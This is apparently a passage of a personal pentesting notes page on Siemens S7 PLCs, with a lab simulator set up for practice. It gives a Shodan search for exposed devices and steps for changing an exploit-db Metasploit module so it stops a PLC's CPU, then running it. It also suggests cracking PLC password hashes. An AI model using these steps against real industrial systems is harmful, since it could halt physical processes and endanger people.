## S7comm

Wireshark wiki S7comm: https://wiki.wireshark.org/S7comm

Shodan dork: *port:102*

There should be also some metasploit modules:

```
$ searchsploit Siemens Simatic S7
```
Add exploit *19831.rb* to metasploit:

Metasploit comes with a ton of exploits already included; however, this Siemens exploit needs to be added. As the exploit was written with theÂ usage of Metasploit in mind, this is a simple task. To add the module, run the following commands on the Kali Linux VM:

To adjust for using a newer Metasploit framework, we need to change the same code in the 19831.rb file. In the file take a look on the line 39:

```OptInt.new('MODE', [false, 'Set true to put the CPU back into RUN mode.',false]),```

Change the preceding to this:

```OptInt.new('MODE', [false, 'Mode 1 to Stop CPU. Set Mode to 2 to put the CPU back into RUN mode.',1]),```

Now copy module to msf user directory:

```
$ cd ~/.msf4/modules/
~/.msf4/modules $ mkdir -p auxiliary/hardware/scada
~/.msf4/modules $ cd auxiliary/hardware/scada
~/.msf4/modules/auxiliary/hardware/scada $ cp /usr/share/exploitdb/platforms/hardware/remote/19831.rb 19831.rb
~/.msf4/modules/auxiliary/hardware/scada $ service postgresql start
~/.msf4/modules/auxiliary/hardware/scada $ msfconsole
```

Now go with metasploit:

```
msf > reload_all
msf > search siemens
msf > use auxiliary/hardware/scada/19831
msf auxiliary(19831) > show options
msf auxiliary(19831) > set RHOSTS 172.16.252.134
RHOSTS => 172.16.252.134
msf auxiliary(19831) > exploit
[+] 172.16.252.134 PLC is running, iso-tsap port is open.
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

```
On newer Siemens devices, they added a password for certain actions! Use *s7_password_hashes_extractor.py* to extract hash and crack it online!

### Siemens S7 PLC simulator

If you wanna play around, you can install an S7 simulator written on python:


1. Download *snap7-full-x.x.x.zip*: https://osdn.net/projects/sfnet_snap7/downloads/1.4.0/snap7-full-1.4.0.zip/

2. Unzip with name snap7-full in ~/

3. Execute the following commands

```
$ cd ~/snap7-full
$ sudo apt-get install python-pip
$ sudo -H pip install python-snap7
$ cd build/unix
$ make -f x86_64_linux.mk
$ cd ../bin/x86_64-linux/
$ sudo cp libsnap7.so /usr/lib
$ sudo ldconfig
$ sudo python
>>> import snap7
>>> s7server = snap7.server.Server()
>>> s7server.create()
>>> s7server.start()
>>> s7server.get_status()
('SrvRunning', 'S7CpuStatusRun', 0)
>>>
```

Now the simulator is ready!

PS: I use Ubuntu 16 on a VM.

### Conclusions

Resources and bibliography:

  * **Industrial Cybersecurity - Efficiently secure critical infrastructure systems** by *Pascal Ackerman*
  * **HACKING EXPOSED: ICS and SCADA Security Secrets and Solutions** by *C. E. Bodungen, B. L. Singer, A. Shbeeb, S. Hilt, K. Wilhoit*
  * **Cybersecurity for Industrial Control Systems: SCADA, DCS, PLC, HMI, and SIS** by *T. Macaulay, B. L. Singer*
  * https://media.blackhat.com/bh-us-11/Beresford/BH_US11_Beresford_S7_PLCs_WP.pdf